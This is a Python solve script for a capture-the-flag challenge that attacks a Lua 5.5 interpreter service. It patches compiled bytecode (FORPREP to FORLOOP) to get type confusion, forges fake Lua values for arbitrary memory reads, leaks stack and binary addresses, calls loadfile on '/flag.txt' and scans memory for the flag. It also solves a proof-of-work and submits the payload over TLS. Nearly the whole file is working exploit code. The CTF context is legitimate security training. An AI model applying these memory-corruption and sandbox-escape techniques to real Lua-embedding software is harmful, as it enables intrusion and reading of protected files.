#!/usr/bin/env python3
import os, sys, re, socket, ssl, struct, subprocess, tempfile, hashlib
HOST='firefly-complete-combustion.chal.uiuc.tf'; PORT=1337
PROMPT=b'send 4-byte big-endian length + Lua chunk:'
LUA_SRC=r'''
local function asnum(x)
  for i=x,x,0 do return i end
end
local function ffrombits(x)
  return string.unpack('d', string.pack('<I8', x))
end
local function fakeval(ptr, tag)
  local diff = ptr - asnum(tag)
  for i = ffrombits(ptr), ffrombits(diff), tag do return i end
end
local function fakefunc(ptr)
  return fakeval(ptr, print)
end
local tag = string.rep('T', 80)
local keep = {}
local function arbstr(ptr, len)
  local hdr = string.rep('\0', 8) .. string.char(0x14,0x10,0x00,0xff) .. string.rep('H', 4) .. string.pack('<I8I8', len, ptr) .. string.rep('X', 16)
  keep[#keep + 1] = hdr
  return fakeval(asnum(hdr) + 0x20, tag)
end
local function u64(s)
  return string.unpack('<I8', s, 1)
end
local function clean(s)
  return string.gsub(s, '[^%g ]', '?')
end
local function hex(s)
  return (string.gsub(s, '.', function(c) return string.format('%02x', string.byte(c)) end))
end
local L = asnum(coroutine.running())
local sp = u64(arbstr(L + 0x58, 8))
print('LEAKSP', string.format('%x', sp))
local base = asnum(print) - 0x25ad0
local loadfile = fakefunc(base + 0x26680)
local f, err = loadfile('/flag.txt')
print('ERR', err)
local start = sp - 0x30000
local stop = sp + 0x30000
local p = start
local hits = 0
while p < stop do
  local s = arbstr(p, 768)
  local pos = string.find(s, 'uiuctf', 1, true)
  if not pos then pos = string.find(s, 'iuctf{', 1, true) end
  if not pos then pos = string.find(s, 'uctf{', 1, true) end
  if not pos then pos = string.find(s, '1_', 1, true) end
  if pos then
    local a = pos - 16
    if a < 1 then a = 1 end
    local b = pos + 180
    local sub = string.sub(s, a, b)
    print('HIT', string.format('%x', p), pos, clean(sub))
    print('HEX', hex(sub))
    hits = hits + 1
    if hits >= 24 then break end
  end
  p = p + 128
end
print('DONE', hits)
'''

def find_luac():
    cand=['./luac','luac','/mnt/data/firefly_chal/luac','/mnt/data/firefly_work/luac']
    for c in cand:
        if os.path.exists(c) or '/' not in c:
            try:
                subprocess.run([c,'-v'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=2)
                return c
            except Exception:
                pass
    raise SystemExit('[-] luac not found. Put this solve.py in the extracted challenge dir with ./luac')

def build_payload():
    luac=find_luac()
    with tempfile.TemporaryDirectory() as td:
        src=os.path.join(td,'x.lua'); out=os.path.join(td,'x.luac')
        open(src,'w').write(LUA_SRC)
        subprocess.check_call([luac,'-o',out,src],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        b=bytearray(open(out,'rb').read())
    n=0
    for i,x in enumerate(b):
        if x==0xca: # patch Lua 5.5 FORPREP -> FORLOOP for type confusion primitive
            b[i]=0xc9; n+=1
    if n < 2:
        print(f'[!] warning: only patched {n} FORPREP bytes',file=sys.stderr)
    return bytes(b)

def has_lz(d,bits):
    return int.from_bytes(d,'big') >> (256-bits) == 0

def solve_pow(buf):
    m=re.search(rb'sha256\((.*?) \+ \?\?\?\) == [01]+\((\d+) leading zero bits\)',buf)
    if not m: return None
    pre=m.group(1); bits=int(m.group(2))
    print(f'[+] solving PoW bits={bits}',file=sys.stderr)
    i=0
    while True:
        s=str(i).encode()
        if has_lz(hashlib.sha256(pre+s).digest(),bits): return s+b'\n'
        i+=1

def recvall_until_prompt(s):
    buf=b''; sent=False; s.settimeout(2)
    while PROMPT not in buf:
        try:
            c=s.recv(4096)
            if not c: break
            buf+=c; sys.stderr.buffer.write(c); sys.stderr.buffer.flush()
        except socket.timeout:
            if not sent and b'sha256' in buf and b'???' in buf:
                ans=solve_pow(buf)
                if ans: s.sendall(ans); sent=True
            continue
    return buf

def run_remote(host,port,payload):
    raw=socket.create_connection((host,port),timeout=10)
    ctx=ssl.create_default_context()
    s=ctx.wrap_socket(raw,server_hostname=host)
    recvall_until_prompt(s)
    print(f'[+] sending raw-leak Lua chunk: {len(payload)} bytes',file=sys.stderr)
    s.sendall(struct.pack('>I',len(payload))+payload)
    out=b''; s.settimeout(8)
    while True:
        try:
            c=s.recv(4096)
            if not c: break
            out+=c
        except socket.timeout:
            break
    s.close(); return out

def run_local(binpath,payload):
    cmd=[binpath]
    if os.path.exists('./ld-linux-x86-64.so.2') and os.path.exists('./libc.so.6'):
        cmd=['./ld-linux-x86-64.so.2','--library-path','.',binpath]
    return subprocess.run(cmd,input=struct.pack('>I',len(payload))+payload,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=10).stdout

def extract_flag(out):
    txt=out.decode('latin1','replace')
    pats=[r'uiuctf\{[^}\s?]+\}', r'iuctf\{[^}\s?]+\}', r'uctf\{[^}\s?]+\}']
    for p in pats:
        m=re.search(p,txt)
        if m:
            x=m.group(0)
            if x.startswith('uiuctf'): return x
            if x.startswith('iuctf'): return 'u'+x
            if x.startswith('uctf'): return 'uiu'+x
    # parse HEX lines too
    for hx in re.findall(r'HEX\s+([0-9a-fA-F]+)',txt):
        try: b=bytes.fromhex(hx)
        except Exception: continue
        for pat,pre in [(rb'uiuctf\{[^}\x00\s]+\}',b''),(rb'iuctf\{[^}\x00\s]+\}',b'u'),(rb'uctf\{[^}\x00\s]+\}',b'uiu')]:
            m=re.search(pat,b)
            if m: return (pre+m.group(0)).decode('latin1')
    return None

def main():
    payload=build_payload()
    if len(sys.argv)>=2 and sys.argv[1]=='--local':
        out=run_local(sys.argv[2] if len(sys.argv)>2 else './firefly',payload)
    else:
        host=sys.argv[1] if len(sys.argv)>1 else HOST; port=int(sys.argv[2]) if len(sys.argv)>2 else PORT
        out=run_remote(host,port,payload)
    sys.stdout.buffer.write(out)
    if not out.endswith(b'\n'): print()
    flag=extract_flag(out)
    print('[+] FLAG:',flag if flag else 'not found')
if __name__=='__main__': main()
